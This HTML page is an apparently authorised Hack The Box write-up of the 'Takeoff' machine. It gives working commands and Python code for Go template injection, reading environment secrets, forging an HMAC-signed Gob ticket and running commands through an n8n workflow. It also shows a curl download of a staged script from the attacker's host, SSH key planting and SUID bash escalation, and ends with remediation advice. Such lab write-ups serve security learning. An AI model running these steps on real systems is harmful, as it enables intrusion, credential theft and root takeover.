@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Takeoff — HTB Writeup (Lanky)</title>
+  <meta name="description" content="Hack The Box Takeoff: Go text/template file read, environment-secret disclosure, forged HMAC-signed Gob boarding pass, command execution, n8n container pivot, host SSH access and SUID Bash privilege escalation.">
+  <link rel="stylesheet" href="../assets/style.css?v=10">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#9992;</text></svg>">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#lab">← all writeups</a>
+    </div>
+  </header>
+
+  <article class="wrap">
+    <a class="back" href="../index.html#lab">back to writeups</a>
+    <svg class="wu-logo" viewBox="0 0 64 64" role="img" aria-label="Takeoff airplane logo">
+      <rect width="64" height="64" rx="8" fill="#11141b"/>
+      <circle cx="32" cy="32" r="22" fill="none" stroke="#22d3ee" stroke-width="2" opacity=".55"/>
+      <path d="M10 38l18-6 8-18 5 1-3 17 13 5c2 1 3 3 2 5l-1 2-15-3-8 11-4-1 3-12-10-2-5 4-3-1z" fill="#a3e635"/>
+    </svg>
+    <h1 style="margin-top:16px;">Takeoff</h1>
+    <div class="subtitle">Hack The Box · Season 12 · completed 4 November 2026 · <a href="https://app.hackthebox.com/machines/Takeoff" target="_blank" rel="noopener">app.hackthebox.com/machines/Takeoff</a></div>
+    <div class="machine-meta">
+      <span class="pill newpill" data-added="2026-11-04">NEW</span>
+      <span class="pill os-linux">Linux</span>
+      <span class="pill diff-hard">Hard</span>
+      <span class="pill season">Season 12</span>
+      <span class="pill">Go SSTI</span>
+      <span class="pill">HMAC / Gob</span>
+      <span class="pill">n8n</span>
+      <span class="pill">Container pivot</span>
+      <span class="pill flagp">User</span>
+      <span class="pill flagp">Root</span>
+      <span class="pill rooted">● Completed</span>
+    </div>
+
+    <div class="callout warn">
+      <span class="tag">Authorised lab note</span>
+      This documents an authorised Hack The Box machine. The target address, flight schedule, validation token and
+      API key are reset-specific and intentionally redacted. The captured flag values are included because each
+      spawned instance issues different flags.
+    </div>
+
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      Go <code>text/template</code> injection in ticket notes → arbitrary file read → environment-secret disclosure →
+      forged HMAC-signed Gob boarding pass → command execution as <code>www-data</code> → leaked n8n API key →
+      root inside the automation container → host home directory exposed as a writable bind mount → SSH as
+      <code>kpark</code> → SUID copy of the host Bash binary → root.
+    </div>
+
+    <dl class="fact">
+      <dt>Exposed services</dt><dd><code>22/tcp</code> OpenSSH and <code>80/tcp</code> nginx</dd>
+      <dt>Application</dt><dd>HTB Airways booking platform backed by a Go service</dd>
+      <dt>Initial execution</dt><dd><code>www-data</code> through a forged boarding-pass notification command</dd>
+      <dt>Container pivot</dt><dd>n8n public API with the Execute Command node</dd>
+      <dt>Host user</dt><dd><code>kpark</code> through a writable bind-mounted home directory</dd>
+      <dt>Root path</dt><dd>Container-root changes ownership and mode of a host Bash copy</dd>
+    </dl>
+
+    <h2><span class="num">01</span>Scoped enumeration</h2>
+    <p>
+      I started with a full TCP scan against the assigned machine only. Two services were exposed: OpenSSH on 22
+      and nginx on 80. The web application identified itself as HTB Airways and implemented the booking workflow
+      in Go.
+    </p>
+    <pre data-lang="bash"><code>sudo nmap -Pn -sC -sV -p- --min-rate 1500 &lt;target-ip&gt;
+
+# 22/tcp open  ssh   OpenSSH 10.0p2 Debian
+# 80/tcp open  http  nginx</code></pre>
+    <p>
+      The application allowed public registration. After signing in, the normal journey was: add a payment card,
+      search for an upcoming flight, choose a seat, add passenger details, pay, download the ticket and check in
+      with a QR-backed boarding pass.
+    </p>
+
+    <h2><span class="num">02</span>Map the booking workflow</h2>
+    <p>
+      A future flight was required because completed or expired schedules could not produce a valid check-in.
+      Rather than hard-code an old identifier, I searched the current date range and extracted the live schedule
+      identifiers from <code>/search/results</code>.
+    </p>
+    <pre data-lang="text"><code>POST /sign-up
+POST /sign-in
+POST /payment-cards
+GET  /search/results?origin=&lt;airport&gt;&amp;destination=&lt;airport&gt;&amp;date=&lt;date&gt;
+GET  /schedules/&lt;schedule-id&gt;
+POST /book/start
+POST /book/&lt;PNR&gt;/passengers
+POST /book/&lt;PNR&gt;/payment</code></pre>
+    <p>
+      A completed booking exposed a notes feature and generated both an HTML preview and a downloadable PDF.
+      Notes were the first useful user-controlled value rendered into server-generated output.
+    </p>
+
+    <h2><span class="num">03</span>Go template injection in ticket notes</h2>
+    <p>
+      The notes field was evaluated as a Go <code>text/template</code>. This was not Jinja-style arithmetic;
+      Go-specific probes such as <code>{{print 777}}</code>, <code>{{.}}</code> and
+      <code>{{printf "%#v" .}}</code> were the useful indicators.
+    </p>
+    <p>
+      The template context exposed a <code>.File</code> method. Supplying a path caused the application to read it
+      and place the result in the ticket preview and PDF:
+    </p>
+    <pre data-lang="text"><code>{{.File "/etc/hostname"}}
+{{.File "/proc/self/environ"}}</code></pre>
+    <pre data-lang="bash"><code>curl -sS -b cookies.txt \
+  -X POST "http://&lt;target-ip&gt;/tickets/&lt;PNR&gt;/notes" \
+  --data-urlencode 'notes={{.File "/proc/self/environ"}}'
+
+curl -sS -b cookies.txt \
+  "http://&lt;target-ip&gt;/tickets/&lt;PNR&gt;/download" \
+  -o ticket.pdf
+
+pdftotext -layout ticket.pdf - | tr '\0' '\n'</code></pre>
+    <p>
+      Reading the PDF was important because environment values are separated by NUL bytes, which made the browser
+      preview less reliable than the extracted document text.
+    </p>
+
+    <h2><span class="num">04</span>Environment-secret disclosure</h2>
+    <p>The service environment disclosed two values that defined the next stages:</p>
+    <table>
+      <tr><th>Variable</th><th>Purpose</th><th>Result</th></tr>
+      <tr><td><code>TICKET_VALIDATION_TOKEN</code></td><td>HMAC key used to sign boarding-pass data</td><td>Recovered — value redacted</td></tr>
+      <tr><td><code>N8N_API_KEY</code></td><td>Public API key for the internal n8n service</td><td>Recovered — value redacted</td></tr>
+      <tr><td><code>USER</code> / <code>HOME</code></td><td>Runtime identity</td><td><code>www-data</code> / <code>/var/www</code></td></tr>
+    </table>
+    <div class="finding">
+      <span class="tag">Root cause</span>
+      <h4>A file-read primitive reached the process environment</h4>
+      <p>
+        The template context combined attacker-controlled template syntax with a privileged file helper. Secrets
+        stored in the process environment then converted a file-read issue into authenticated message forgery and
+        access to an internal automation platform.
+      </p>
+    </div>
+
+    <h2><span class="num">05</span>Understand the signed boarding pass</h2>
+    <p>
+      The check-in page supplied <code>qr_data</code> as Base64. Decoding it showed a Go Gob message followed by a
+      32-byte HMAC-SHA256 signature. The embedded JSON carried the booking identity and a notification command.
+    </p>
+    <pre data-lang="text"><code>qr_data = base64( gob_message || hmac_sha256(validation_key, gob_message) )
+
+JSON fields:
+  PNR
+  Token
+  Seat
+  Passenger
+  NotifyCmd</code></pre>
+    <p>
+      A real, unused booking was still required: the application verified the signature and then marked the PNR as
+      used. The safe way to validate the recovered HMAC key was to sign the original Gob data and compare the result
+      with the supplied signature before changing anything.
+    </p>
+    <pre data-lang="python"><code>raw = base64.b64decode(qr_data)
+gob_data, original_signature = raw[:-32], raw[-32:]
+
+check = hmac.new(validation_key, gob_data, hashlib.sha256).digest()
+assert hmac.compare_digest(check, original_signature)</code></pre>
+
+    <h2><span class="num">06</span>Rebuild the Gob message and forge NotifyCmd</h2>
+    <p>
+      The type-definition portion of the Gob stream could be copied unchanged. Only the length-prefixed value
+      message needed rebuilding after replacing <code>NotifyCmd</code> in the JSON.
+    </p>
+    <pre data-lang="python"><code>def gobuint(value):
+    if value &lt; 128:
+        return bytes([value])
+    encoded = value.to_bytes((value.bit_length() + 7) // 8, "big")
+    return bytes([256 - len(encoded)]) + encoded
+
+new_json = json.dumps(ticket, separators=(",", ":")).encode()
+inner = b"\x01" + gobuint(len(new_json)) + new_json + b"\x00"
+structure = gobuint(len(inner)) + inner
+value_message = type_id + structure
+forged_gob = type_definition + gobuint(len(value_message)) + value_message
+signature = hmac.new(validation_key, forged_gob, hashlib.sha256).digest()
+forged_qr = base64.b64encode(forged_gob + signature)</code></pre>
+    <p>A harmless proof copied the target hostname to a temporary file:</p>
+    <pre data-lang="text"><code>NotifyCmd = cp /etc/hostname /tmp/takeoff-proof</code></pre>
+    <p>
+      Posting the forged value to <code>/api/check-in</code> returned a successful redirect. Reading the temporary
+      file back through <code>.File</code> returned the hostname, proving execution as the web-service account.
+    </p>
+
+    <h2><span class="num">07</span>Stage arbitrary shell commands</h2>
+    <p>
+      <code>NotifyCmd</code> was split into arguments and executed without a shell. Pipes, redirection and command
+      substitution therefore did not work directly. I used the command twice: first to download a controlled shell
+      script, then to execute it through Bash.
+    </p>
+    <pre data-lang="text"><code>curl http://&lt;tun0-ip&gt;:8000/stage.sh -o /tmp/stage.sh
+bash /tmp/stage.sh</code></pre>
+    <pre data-lang="bash"><code>python3 -m http.server 8000 --directory ./payloads</code></pre>
+    <p>
+      The staged script wrote command output to a world-readable temporary file. The SSTI file-read primitive then
+      returned that output without requiring an interactive reverse shell.
+    </p>
+
+    <h2><span class="num">08</span>Pivot into n8n</h2>
+    <p>
+      Local enumeration showed n8n listening on <code>127.0.0.1:5678</code>. The leaked API key authenticated to its
+      public REST API. From the web-service context, I created and activated a temporary workflow containing a
+      Webhook node connected to an Execute Command node.
+    </p>
+    <pre data-lang="python"><code>import json
+
+path = "&lt;random-path&gt;"
+command = "{ id; } 2&gt;&amp;1; true"
+
+workflow = {
+    "name": path,
+    "nodes": [
+        {
+            "parameters": {
+                "httpMethod": "POST",
+                "path": path,
+                "responseMode": "lastNode",
+            },
+            "id": "webhook",
+            "name": "Webhook",
+            "type": "n8n-nodes-base.webhook",
+            "typeVersion": 2,
+            "position": [200, 300],
+            "webhookId": path,
+        },
+        {
+            "parameters": {"command": command},
+            "id": "exec",
+            "name": "Exec",
+            "type": "n8n-nodes-base.executeCommand",
+            "typeVersion": 1,
+            "position": [420, 300],
+        },
+    ],
+    "connections": {
+        "Webhook": {
+            "main": [[{"node": "Exec", "type": "main", "index": 0}]]
+        }
+    },
+    "settings": {},
+}
+
+open("/tmp/workflow.json", "w").write(json.dumps(workflow))</code></pre>
+    <pre data-lang="bash"><code>BASE=http://127.0.0.1:5678
+KEY='&lt;redacted-api-key&gt;'
+
+CREATE=$(curl -sS \
+  -H "X-N8N-API-KEY: $KEY" \
+  -H 'Content-Type: application/json' \
+  -X POST "$BASE/api/v1/workflows" \
+  --data-binary @/tmp/workflow.json)
+
+ID=$(printf '%s' "$CREATE" | grep -oP '"id":"\K[^"]+' | head -1)
+
+curl -sS -H "X-N8N-API-KEY: $KEY" \
+  -X POST "$BASE/api/v1/workflows/$ID/activate"
+
+curl -sS -X POST "$BASE/webhook/&lt;random-path&gt;" \
+  -H 'Content-Type: application/json' -d '{}'</code></pre>
+    <p>
+      Invoking the webhook returned <code>uid=0(root)</code>. This was root inside an Alpine-based container, not yet
+      root on the Debian host.
+    </p>
+
+    <h2><span class="num">09</span>Identify the host bind mount</h2>
+    <p>
+      Container checks found no Docker socket, useful block devices or an immediately exploitable capability set.
+      The important result was in <code>/proc/mounts</code>:
+    </p>
+    <pre data-lang="text"><code>/dev/sda4 /root ext4 rw,relatime,errors=remount-ro 0 0</code></pre>
+    <p>
+      The container's <code>/root</code> mapped to the host's <code>/home/kpark</code>. It was writable and did not use
+      <code>nosuid</code>. Container-root could therefore write files into the host user's home directory and change
+      their ownership and mode on the shared filesystem.
+    </p>
+
+    <h2><span class="num">10</span>Write an SSH key and recover user.txt</h2>
+    <p>I generated a dedicated key on Kali and used the n8n command node to install the public key:</p>
+    <pre data-lang="bash"><code># Kali
+ssh-keygen -t ed25519 -f ./takeoff_key -N '' -C takeoff
+
+# Executed by container-root through n8n
+mkdir -p /root/.ssh
+printf '%s\n' '&lt;public-key&gt;' &gt; /root/.ssh/authorized_keys
+chmod 700 /root/.ssh
+chmod 600 /root/.ssh/authorized_keys
+chown -R 1001:1001 /root/.ssh</code></pre>
+    <pre data-lang="bash"><code>ssh -i ./takeoff_key kpark@&lt;target-ip&gt; 'id; cat ~/user.txt'
+
+# uid=1001(kpark) gid=1001(kpark)</code></pre>
+    <div class="flag"><span class="label">user.txt</span><code>d5baee70798ce26fe3d1ca41ed8159a5</code></div>
+
+    <h2><span class="num">11</span>Turn the bind mount into host root</h2>
+    <p>
+      The container used BusyBox, so its shell was not suitable for the final escalation. As <code>kpark</code>, I
+      copied the host's Debian Bash binary into the bind-mounted home directory. Container-root then changed the
+      owner to root and enabled the SUID bit on the same inode.
+    </p>
+    <pre data-lang="bash"><code># Host session as kpark
+cp /bin/bash ~/mybash
+chmod 755 ~/mybash
+
+# n8n container as root: /root == host /home/kpark
+chown 0:0 /root/mybash
+chmod 4755 /root/mybash
+ls -la /root/mybash
+
+# -rwsr-xr-x 1 root root ... /root/mybash</code></pre>
+    <p>Back on the host, <code>-p</code> preserved the effective UID:</p>
+    <pre data-lang="bash"><code>~/mybash -p -c 'id; cat /root/root.txt'
+
+# uid=1001(kpark) euid=0(root)</code></pre>
+    <div class="flag"><span class="label">root.txt</span><code>61c79862c4188e9860e79978d1e791f7</code></div>
+
+    <h2><span class="num">12</span>Evidence chain</h2>
+    <table>
+      <tr><th>Stage</th><th>Validation</th></tr>
+      <tr><td>Recon</td><td>Only SSH and nginx were externally exposed.</td></tr>
+      <tr><td>Template injection</td><td><code>.File</code> returned <code>/proc/self/environ</code> through the ticket PDF.</td></tr>
+      <tr><td>Signing secret</td><td>Re-signing the original Gob exactly matched its existing HMAC.</td></tr>
+      <tr><td>Command execution</td><td>A forged ticket copied <code>/etc/hostname</code> and the file-read primitive returned it.</td></tr>
+      <tr><td>n8n pivot</td><td>The webhook response showed <code>uid=0(root)</code> inside the container.</td></tr>
+      <tr><td>Host user</td><td>SSH authenticated as <code>kpark</code> using the injected key.</td></tr>
+      <tr><td>Host root</td><td>The SUID Bash process showed <code>euid=0(root)</code> before reading <code>root.txt</code>.</td></tr>
+    </table>
+
+    <h2><span class="num">13</span>Lessons from the path</h2>
+    <ul>
+      <li><strong>Identify the template engine first.</strong> Go template behaviour was materially different from Jinja or Twig.</li>
+      <li><strong>File read became authentication bypass.</strong> Environment secrets were more valuable than ordinary configuration files.</li>
+      <li><strong>Signed data is only as strong as key isolation.</strong> HMAC prevented tampering until the signing key was disclosed.</li>
+      <li><strong>Valid business state still mattered.</strong> A forged boarding pass needed a real, future, unused booking.</li>
+      <li><strong>Command execution was not automatically a shell.</strong> Understanding argument splitting led to a reliable two-stage payload.</li>
+      <li><strong>Container root was a boundary, not the finish.</strong> The writable host bind mount supplied the actual escape path.</li>
+      <li><strong>Mount options matter.</strong> The absence of <code>nosuid</code> allowed a mode change inside the container to affect host execution.</li>
+    </ul>
+
+    <h2><span class="num">14</span>If this were your environment</h2>
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>Server-side template injection with arbitrary file read</h4>
+      <p>
+        Store ticket notes as data and render them with escaping enabled. Do not parse user content as templates,
+        and never expose general-purpose file helpers to a template context.
+      </p>
+    </div>
+    <div class="finding">
+      <span class="tag">Finding 2 · Critical</span>
+      <h4>Secrets in the web-service environment enabled ticket forgery and internal API access</h4>
+      <p>
+        Separate signing and automation credentials from the public web process. Use short-lived scoped secrets,
+        rotate them after disclosure, and prevent diagnostic or document-generation paths from reading process
+        environment files.
+      </p>
+    </div>
+    <div class="finding">
+      <span class="tag">Finding 3 · Critical</span>
+      <h4>Signed client data controlled a server-side command</h4>
+      <p>
+        Do not place executable commands in client-controlled tickets. Represent notification actions as fixed
+        server-side identifiers and map them to allowlisted operations after independent authorisation checks.
+      </p>
+    </div>
+    <div class="finding">
+      <span class="tag">Finding 4 · Critical</span>
+      <h4>Internal n8n API key permitted arbitrary command workflows</h4>
+      <p>
+        Restrict the API to a dedicated management network, disable Execute Command nodes where they are not
+        required, enforce least-privilege service accounts, rotate API keys and alert on workflow creation or
+        activation by non-administrative services.
+      </p>
+    </div>
+    <div class="finding">
+      <span class="tag">Finding 5 · Critical</span>
+      <h4>Writable host home bind-mounted into a root container without nosuid</h4>
+      <p>
+        Avoid mounting user home directories into containers. Where a mount is unavoidable, make it read-only and
+        use <code>nosuid</code>, <code>nodev</code> and <code>noexec</code>. Run the container as a non-root UID and use
+        user-namespace remapping so container-root cannot assign host-root ownership.
+      </p>
+    </div>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to all writeups</a></p>
+  </article>
+
+  <footer>
+    <div class="wrap">Takeoff · completed 4 November 2026 · notes by Luke &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div>
+  </footer>
+</body>
+</html>
